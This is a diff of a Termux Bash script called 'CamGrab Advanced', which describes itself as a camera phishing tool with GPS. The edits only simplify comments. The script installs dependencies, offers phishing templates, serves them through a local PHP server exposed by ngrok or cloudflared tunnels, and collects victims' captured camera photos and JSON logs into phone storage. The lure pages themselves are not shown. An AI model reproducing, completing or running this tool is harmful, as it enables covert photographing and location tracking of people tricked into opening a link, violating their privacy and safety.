@@ -1,29 +1,28 @@
 #!/data/data/com.termux/files/usr/bin/bash
 
 #############################################
-#   CamGrab Advanced - Termux Edition      #
-#   Camera Phishing Tool with GPS & Info   #
+#   camgrab advanced - termux edition      #
+#   camera phishing tool with gps          #
 #############################################
 
-# Colors for better UI
+# colors
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 PURPLE='\033[0;35m'
 CYAN='\033[0;36m'
-NC='\033[0m' # No Color
+NC='\033[0m'
 
-# Storage paths
+# paths
 STORAGE_PATH="/sdcard/CamGrabs"
 LOG_PATH="$STORAGE_PATH/logs"
 CAMSHOTS_DIR="camshots"
 LOGS_DIR="logs"
 
-# Create directories
 mkdir -p "$STORAGE_PATH" "$LOG_PATH" "$CAMSHOTS_DIR" "$LOGS_DIR"
 
-# Banner
+# banner
 show_banner() {
     clear
     echo -e "${PURPLE}"
@@ -34,7 +33,7 @@ show_banner() {
     echo -e "${NC}"
 }
 
-# Check dependencies
+# check deps
 check_dependencies() {
     echo -e "${CYAN}[*] Checking dependencies...${NC}"
     local missing_deps=()
@@ -67,7 +66,7 @@ check_dependencies() {
     fi
 }
 
-# Install dependencies
+# install missing deps
 install_dependencies() {
     echo -e "${CYAN}[*] Installing dependencies...${NC}"
     pkg update -y
@@ -90,7 +89,7 @@ install_dependencies() {
     fi
 }
 
-# Select template
+# choose template
 select_template() {
     echo -e "${CYAN}╔═══════════════════════════════════════╗${NC}"
     echo -e "${CYAN}║       Select Phishing Template       ║${NC}"
@@ -114,7 +113,7 @@ select_template() {
     esac
 }
 
-# Start tunneling service
+# start tunnel
 start_tunnel() {
     echo -e "${CYAN}[*] Starting tunnel service...${NC}"
     
@@ -149,7 +148,7 @@ start_tunnel() {
     fi
 }
 
-# Monitor captures
+# watch for captures
 monitor_captures() {
     echo -e "${GREEN}[*] Monitoring for captures...${NC}"
     echo -e "${YELLOW}[*] Press CTRL+C to stop${NC}"
@@ -158,7 +157,7 @@ monitor_captures() {
     local capture_count=0
     
     while true; do
-        # Move captured photos
+        # move photos
         if [ -d "$CAMSHOTS_DIR" ]; then
             for file in "$CAMSHOTS_DIR"/*.jpg; do
                 if [ -f "$file" ]; then
@@ -174,7 +173,7 @@ monitor_captures() {
             done
         fi
         
-        # Move logs
+        # move logs
         if [ -d "$LOGS_DIR" ]; then
             mv "$LOGS_DIR"/* "$LOG_PATH/" 2>/dev/null
         fi
@@ -183,14 +182,13 @@ monitor_captures() {
     done
 }
 
-# Cleanup on exit
+# cleanup
 cleanup() {
     echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
     kill $php_pid 2>/dev/null
     pkill ngrok 2>/dev/null
     pkill cloudflared 2>/dev/null
     
-    # Show statistics
     photo_count=$(find "$STORAGE_PATH" -name "*.jpg" 2>/dev/null | wc -l)
     log_count=$(find "$LOG_PATH" -name "*.json" 2>/dev/null | wc -l)
     
@@ -205,13 +203,12 @@ cleanup() {
 
 trap cleanup INT
 
-# Main execution
+# main
 main() {
     show_banner
     check_dependencies
     select_template
     
-    # Start PHP server
     echo -e "${CYAN}[*] Starting PHP server...${NC}"
     php -S 127.0.0.1:8080 > /dev/null 2>&1 &
     php_pid=$!
